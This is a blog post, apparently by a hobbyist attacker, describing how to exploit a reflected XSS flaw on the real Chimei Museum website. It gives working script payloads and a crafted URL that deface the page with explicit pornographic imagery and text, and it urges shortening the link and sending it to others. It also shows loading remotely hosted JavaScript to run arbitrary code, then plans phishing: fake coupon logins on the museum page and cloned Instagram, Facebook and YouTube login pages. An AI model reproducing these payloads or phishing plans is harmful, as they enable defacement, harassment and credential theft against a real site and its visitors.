# XSS 實戰練習-奇美博物館漏洞探討與釣魚運用

## 前情提要

要自己找到哪些網站有 XSS 太累了，有些技巧，例如可以針對某些類型的網頁去搜尋：

租屋網阿、民宿網、某高中網站、藥廠網站阿等等。

這些網站都寫得比較不專業，自然容易有漏洞。

[回報漏洞:奇美博物館](https://zeroday.hitcon.org/vulnerability/ZD-2023-00843)

![image](https://hackmd.io/_uploads/H1_qzsEh6.png)

偷吃步是去 zerodays 上面看：尋找公開的，就會發現有些漏洞網頁主還是死不修補，

於是我們就可以大作文章。

## 觀念解說

玩了一下，發現網址列上面的確會存儲 query 內容。

這篇文章就要以奇美博物館這個反射型 XXS 來實戰，並且實驗操作的極限在哪。

## 效果展示

### 第一個 payload

```
<script>document.querySelector(".header-block__menu").remove();document.querySelector("#search > section.m-banner.m-banner-noCrumbBg").style.backgroundImage="url('https://ei.phncdn.com/videos/202003/07/290648122/original/(m=eaSaaTbaAaaaa)(mh=BCHkqlaKnE27_UlO)10.jpg')";document.querySelectorAll("h2")[2].innerText="3/3顏射展，男性精液的前衛藝術！"</script>
```

![image](https://hackmd.io/_uploads/HJZ8Mxpna.png)

丟進去之後把網址複製起來，通常這時候找個縮網址即可：
https://reurl.cc/M4GbxK

這樣就可以傳給別人看了！超級屌。

<script>document.querySelector(".header-block__menu").remove();document.querySelector("#search > section.m-banner.m-banner-noCrumbBg").style.backgroundImage="url('https://ei.phncdn.com/videos/202003/07/290648122/original/(m=eaSaaTbaAaaaa)(mh=BCHkqlaKnE27_UlO)10.jpg')";document.querySelectorAll("h2")[2].innerText="3/3顏射展，男性精液的前衛藝術！"</script>

### 第二個 payload

[網址內容長這樣](https://www.chimeimuseum.org/search?q=++%3Cscript%3Edocument.querySelector%28%22.header-block__menu%22%29.remove%28%29%3Bdocument.querySelector%28%22%23search+%3E+section.m-banner.m-banner-noCrumbBg%22%29.style.backgroundImage%3D%22url%28%27https%3A%2F%2Fpng.pngtree.com%2Fthumb_back%2Ffw800%2Fbackground%2F20230720%2Fpngtree-glimmering-bathroom-with-an-abundance-of-light-fixtures-sizable-framed-mirror-image_3709771.jpg%27%29%22%3Bdocument.querySelectorAll%28%22h2%22%29%5B2%5D.innerText%3D%223%2F4%E9%AD%AF%E8%9B%87%E5%B1%95%EF%BC%8C%E9%8F%A1%E5%AD%90%E5%85%A7%E7%9C%8B%E8%A6%8B%E8%87%AA%E5%B7%B1%E7%9A%84%E6%A8%A1%E6%A8%A3%EF%BC%81%22%3C%2Fscript%3E)

![image](https://hackmd.io/_uploads/ryAV7mUhT.png)

## 兩種反射型 XSS

眾所周知，斯斯有三種，XSS 也是剛好 TM 的三種！今天我們不談其他兩種，只說這個最弱的：
反射型 XSS(而它本身又分為兩種)。

這個分類很重要，一般網路上都沒有，也是我玩這麼久去歸類出來的。

### 存儲型反射

第一種是存儲型反射，會把搜尋的 query 丟在網址列上，這個有操作性可言，
可以搞 prank 也可以玩比較大的。

### 廢物型反射

第二種是廢物型反射，也就是說網頁是使用 ajax 動態加載，因此噴出來的 XSS 沒什麼意義，只有自己手測可以復現，沒辦法讓人家看到你打出來的漏洞。

大多數反射 XSS 都是屬於第二種，所以網站主不去修補也沒關係，這就讓人感覺「明明有 XSS 怎麼好像沒屁用？」，因為這些人不了解原來 query(搜尋字符)沒有出現在網址列的反射型，僅僅廢物型的反射。

其他文章我就不查了，舊的 XSS 筆記有整理。

[淺談 XSS 攻擊與防禦的各個環節](https://blog.huli.tw/2021/06/19/xss-attack-and-defense/)

[【跨域脚本攻击】第一弹——反射型 XSS](https://zhuanlan.zhihu.com/p/347609837)

## 使用 JSdelivr 託管 js

注入 XSS 的時候引用一包託管的 JS，然後試試看呼叫裡面的函數：

![image](https://hackmd.io/_uploads/S1vhL622a.png)

成功了！代表這樣操作是可以的，也就是說只要引入自己的託管 JS，想跑什麼程式碼都可以唷。
這時候如果裡面有運用到 ajax 就變成了 JSONP。

[筆記-如何使用 Github 與 JSdelivr 託管 js 代碼？](https://hackmd.io/faXPpHLdQGuBHZa77pJquQ#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Github%E8%88%87JSdelivr%E8%A8%97%E7%AE%A1js%E4%BB%A3%E7%A2%BC%EF%BC%9F)

## 接下來的發展

1.把這個網頁拿去做釣魚網站，這個方式的缺點是 url 已經是奇美博物館，細心的人不會上當。

2.將奇美博物館裡面的內容魔幻改寫，進行騙資料的操作。

詳細的做法可能是以"某個優惠領取"，要先登入這樣子的模式，跳出視窗去騙取。

以上兩種都要考慮散播的地方，看是在賴上丟給朋友還是其他地方，這點頗重要。

### 釣魚網站的細節

第一個點子是使用 IG，方式是做一個假網美的頁面，讓人想要登入進去。
也就是 PTT 鄉民求"傳送門"的這個慾望心態。

這個做法有一個限制是「散播的地點」，假設是廣發在論壇群組之類的，不能做知名人物，
假設是奎丁，大家都知道是 zamy_ding，也就是 ID，而這個門就不值得登入了。

第二個點子，用騙的，直接假冒 IG 某網美身分，然後丟連結給人家追蹤，當他按下去，
勢必要先進行登入這件事情。

<iframe width="560" height="315" src="https://www.youtube.com/embed/jTrNYxDuSWc?si=YgkSROG4LyU0YgDs" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

我打算自己 clone 手刻出來，順便練習 HTML 三件套的基礎功力，未來也可以放 github 上。

那我的計劃就是 clone IG FB YT 這三個，做完三個專案，也就騙這三個吧 XD
